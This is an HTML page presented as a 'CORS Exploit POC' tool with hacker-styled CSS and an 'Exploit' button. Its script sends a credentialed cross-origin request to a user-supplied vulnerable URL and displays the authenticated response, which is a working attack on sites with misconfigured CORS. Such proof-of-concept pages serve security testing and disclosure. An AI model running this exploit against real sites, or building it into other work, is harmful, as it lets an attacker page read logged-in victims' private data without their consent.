<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS POC Exploit</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden; /* Prevent scroll bars */
            box-sizing: border-box;
        }

        body {
            background-color: #000;
            color: #33ff33;
            font-family: "Courier New", Courier, monospace;
        }

        h2, h3 {
            text-align: center;
            text-transform: uppercase;
            color: #15ff00;
            margin: 20px 0;
        }

        h2::before, h2::after, h3::before, h3::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            color: #33ff33;
            overflow: hidden;
        }

        h2::before, h3::before {
            left: 2px;
            text-shadow: -2px 0 red;
            clip: rect(44px, 450px, 56px, 0);
        }

        h2::after, h3::after {
            left: -2px;
            text-shadow: -2px 0 blue;
            clip: rect(24px, 450px, 80px, 0);
        }

        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
        }

        .input-container {
            display: flex;
            justify-content: space-between; /* Align input on the left and button on the right */
            align-items: center;
            margin-bottom: 20px;
        }

        input {
            background-color: #111;
            color: #f706e3;
            border: 2px solid #ea07ff;
            padding: 10px;
            width: 70%; /* Adjust the width of the input */
            font-family: "Courier New", Courier, monospace;
        }

        button {
            background-color: #000;
            color: #f5320f;
            border: 2px solid #f10808;
            padding: 5px 20px;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 20%; /* Adjust the width of the button */
        }

        button::before {
            content: "☠";
            font-size: 24px;
            margin-right: 10px;
        }

        button:hover {
            background-color: #f30c0c;
            color: #000;
        }

        textarea {
            background-color: #111;
            color: #33ff33;
            border: 2px solid #ff0505;
            width: 100%;
            height: 50vh;
            font-family: "Courier New", Courier, monospace;
            resize: none; /* Prevent resizing to avoid overflow */
        }

        footer {
            text-align: center;
            margin-top: 55px;
            color: #33ff33;
        }

        /* Media Queries for Responsiveness */
        @media (min-width: 768px) {
            .input-container {
                justify-content: space-between;
            }

            input {
                width: 70%; /* Adjust width for larger screens */
            }

            button {
                width: 20%;
            }

            textarea {
                height: 60vh; /* Increase height for larger screens */
            }
        }

        @media (max-width: 480px) {
            h2, h3 {
                font-size: 18px;
            }

            button {
                font-size: 14px;
            }

            textarea {
                height: 40vh; /* Reduce height for smaller screens */
            }

            .input-container {
                flex-direction: column; /* Stack input and button on smaller screens */
            }

            input, button {
                width: 100%; /* Full width on small screens */
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 data-text="CORS Exploit POC">CORS Exploit POC</h2>
        <hr><br>

        <div class="input-container">
            <input type="text" id="targetURL" placeholder="Enter the target vulnerable URL here" />
            <button onclick="exploitCORS()">Exploit</button>
        </div>

        <textarea id="fetchedResource" placeholder="Click the button to fetch the resource!"></textarea>

        <footer>
            © 2024 | Created By KALMUX
        </footer>
    </div>

    <script>
        function exploitCORS() {
            var targetUrl = document.getElementById("targetURL").value;
    
            if (!targetUrl) {
                alert("Please enter a valid target URL!");
                return;
            }
    
            // Clear the previous response
            document.getElementById("fetchedResource").value = "";
    
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('GET', targetUrl, true); 
            req.withCredentials = true; 
            req.send();
        }
    
        function reqListener() {
            document.getElementById("fetchedResource").value = this.responseText;
    
            if (!this.responseText) {
                alert("No response received. Check if the target is vulnerable.");
            }
        }
    </script>
</body>
</html>
